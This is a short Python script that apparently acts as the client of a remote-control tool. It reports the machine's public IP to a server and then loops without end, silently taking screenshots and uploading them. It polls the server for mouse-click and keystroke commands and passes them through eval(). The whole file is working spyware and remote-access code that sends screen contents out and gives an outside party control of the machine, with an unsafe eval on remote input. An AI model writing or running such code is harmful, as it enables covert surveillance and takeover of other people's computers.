import keyboard
import pyautogui
import requests
from PIL import ImageGrab
import os
import cv2
import numpy as np
# 截取整个屏幕
def getip():
    try:
        return requests.get(url="http://ip.42.pl/raw").text
    except:
        return "can't get the ip"
url = '127.0.0.1:5000'
bh = requests.get('http://'+url+'/dl',params={'ip':getip()}).text
print(bh)
while True:
    try:
        img = pyautogui.screenshot()
        img = cv2.cvtColor(np.asarray(img), cv2.COLOR_RGB2BGR)
        cv2.imwrite('C:\\Users\\'+os.getlogin()+'\\Documents\\screenshot.png', img)
        cv2.waitKey(0)
        requests.post('http://'+url+'/sc',files={'file':open('C:\\Users\\'+os.getlogin()+'\\Documents\\screenshot.png','rb').read()})
        os.remove('C:\\Users\\'+os.getlogin()+'\\Documents\\screenshot.png')
        nr = requests.get('http://'+url+'/ml').text
        if nr.replace(' ','') == '':
            continue
        elif nr.replace(' ','')[0] == bh:
            nr = nr.replace(' ','')[2:]
            if nr[0:5] == 'left:':
                nr = eval(nr[5:])
                pyautogui.click(nr[0],nr[1])
            elif nr[0:6] == 'right:':
                nr = eval(nr[6:])
                pyautogui.rightClick(nr[0],nr[1])
            elif nr[0:4] == 'key:':
                nr = nr[4:]
                keyboard.write(nr)
    except Exception as a:
        print('error:',a)
        #os.remove('C:\\Users\\'+os.getlogin()+'\\Documents\\screenshot.png')